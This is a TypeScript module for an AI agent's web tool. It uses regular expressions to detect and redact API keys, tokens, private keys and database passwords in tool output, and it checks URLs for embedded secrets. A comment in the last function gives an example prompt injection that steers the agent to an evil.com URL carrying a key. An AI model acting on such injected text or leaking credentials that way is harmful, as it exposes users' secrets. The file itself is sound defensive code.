/**
 * Regex-based secret detection / redaction for web tool output.
 *
 * Ported from Hermes Agent `agent/redact.py`. Scans text (page content,
 * response bodies, URLs) for API keys, tokens, credentials, private keys,
 * DB connection strings, and phone numbers before returning results to
 * the model.
 *
 * Two entry points:
 *   - `containsSecret(text)` — cheap check, used for URL exfil guard
 *   - `redactSecrets(text)` — full pass, returns redacted string
 */

const PREFIX_PATTERNS: string[] = [
  String.raw`sk-[A-Za-z0-9_-]{10,}`,
  String.raw`ghp_[A-Za-z0-9]{10,}`,
  String.raw`github_pat_[A-Za-z0-9_]{10,}`,
  String.raw`gho_[A-Za-z0-9]{10,}`,
  String.raw`ghu_[A-Za-z0-9]{10,}`,
  String.raw`ghs_[A-Za-z0-9]{10,}`,
  String.raw`ghr_[A-Za-z0-9]{10,}`,
  String.raw`xox[baprs]-[A-Za-z0-9-]{10,}`,
  String.raw`AIza[A-Za-z0-9_-]{30,}`,
  String.raw`pplx-[A-Za-z0-9]{10,}`,
  String.raw`fal_[A-Za-z0-9_-]{10,}`,
  String.raw`fc-[A-Za-z0-9]{10,}`,
  String.raw`bb_live_[A-Za-z0-9_-]{10,}`,
  String.raw`gAAAA[A-Za-z0-9_=-]{20,}`,
  String.raw`AKIA[A-Z0-9]{16}`,
  String.raw`sk_live_[A-Za-z0-9]{10,}`,
  String.raw`sk_test_[A-Za-z0-9]{10,}`,
  String.raw`rk_live_[A-Za-z0-9]{10,}`,
  String.raw`SG\.[A-Za-z0-9_-]{10,}`,
  String.raw`hf_[A-Za-z0-9]{10,}`,
  String.raw`r8_[A-Za-z0-9]{10,}`,
  String.raw`npm_[A-Za-z0-9]{10,}`,
  String.raw`pypi-[A-Za-z0-9_-]{10,}`,
  String.raw`dop_v1_[A-Za-z0-9]{10,}`,
  String.raw`doo_v1_[A-Za-z0-9]{10,}`,
  String.raw`am_[A-Za-z0-9_-]{10,}`,
  String.raw`sk_[A-Za-z0-9_]{10,}`,
  String.raw`tvly-[A-Za-z0-9]{10,}`,
  String.raw`exa_[A-Za-z0-9]{10,}`,
  String.raw`gsk_[A-Za-z0-9]{10,}`,
  String.raw`syt_[A-Za-z0-9]{10,}`,
]

const PREFIX_RE = new RegExp(
  `(?<![A-Za-z0-9_-])(${PREFIX_PATTERNS.join('|')})(?![A-Za-z0-9_-])`,
  'g',
)

const SECRET_ENV_NAMES =
  String.raw`(?:API_?KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|AUTH)`
const ENV_ASSIGN_RE = new RegExp(
  String.raw`([A-Z0-9_]{0,50}${SECRET_ENV_NAMES}[A-Z0-9_]{0,50})\s*=\s*(['"]?)(\S+)\2`,
  'g',
)

const JSON_KEY_NAMES =
  String.raw`(?:api_?[Kk]ey|token|secret|password|access_token|refresh_token|auth_token|bearer|secret_value|raw_secret|secret_input|key_material)`
const JSON_FIELD_RE = new RegExp(
  `("${JSON_KEY_NAMES}")\\s*:\\s*"([^"]+)"`,
  'gi',
)

const AUTH_HEADER_RE = /(Authorization:\s*Bearer\s+)(\S+)/gi

const TELEGRAM_RE = /(bot)?(\d{8,}):([-A-Za-z0-9_]{30,})/g

const PRIVATE_KEY_RE =
  /-----BEGIN[A-Z ]*PRIVATE KEY-----[\s\S]*?-----END[A-Z ]*PRIVATE KEY-----/g

const DB_CONNSTR_RE =
  /((?:postgres(?:ql)?|mysql|mongodb(?:\+srv)?|redis|amqp):\/\/[^:]+:)([^@]+)(@)/gi

function maskToken(token: string): string {
  if (token.length < 18) return '***'
  return `${token.slice(0, 6)}...${token.slice(-4)}`
}

/**
 * Quick check — does the text contain anything that looks like a secret?
 * Used for URL exfiltration guard where we want to reject early.
 */
export function containsSecret(text: string): boolean {
  if (!text) return false
  PREFIX_RE.lastIndex = 0
  if (PREFIX_RE.test(text)) return true
  PRIVATE_KEY_RE.lastIndex = 0
  if (PRIVATE_KEY_RE.test(text)) return true
  return false
}

/**
 * Apply all redaction patterns to `text`. Safe on any string; non-matching
 * input passes through unchanged. Returns the text with matches masked.
 */
export function redactSecrets(text: string): string {
  if (text == null) return text
  if (typeof text !== 'string') text = String(text)
  if (!text) return text

  text = text.replace(PREFIX_RE, (_m, tok: string) => maskToken(tok))

  text = text.replace(ENV_ASSIGN_RE, (_m, name: string, q: string, v: string) =>
    `${name}=${q}${maskToken(v)}${q}`,
  )

  text = text.replace(JSON_FIELD_RE, (_m, key: string, value: string) =>
    `${key}: "${maskToken(value)}"`,
  )

  text = text.replace(AUTH_HEADER_RE, (_m, prefix: string, tok: string) =>
    `${prefix}${maskToken(tok)}`,
  )

  text = text.replace(TELEGRAM_RE, (_m, prefix: string | undefined, digits: string) =>
    `${prefix ?? ''}${digits}:***`,
  )

  text = text.replace(PRIVATE_KEY_RE, '[REDACTED PRIVATE KEY]')

  text = text.replace(DB_CONNSTR_RE, (_m, pre: string, _pw: string, at: string) =>
    `${pre}***${at}`,
  )

  return text
}

/**
 * URL-level exfiltration check — returns true if the URL (including
 * percent-decoded form) embeds anything that looks like a secret. A
 * prompt injection could trick the agent into navigating to
 * `https://evil.com/steal?key=sk-ant-...` to leak credentials.
 */
export function urlContainsSecret(url: string): boolean {
  if (containsSecret(url)) return true
  try {
    const decoded = decodeURIComponent(url)
    return containsSecret(decoded)
  } catch {
    return false
  }
}
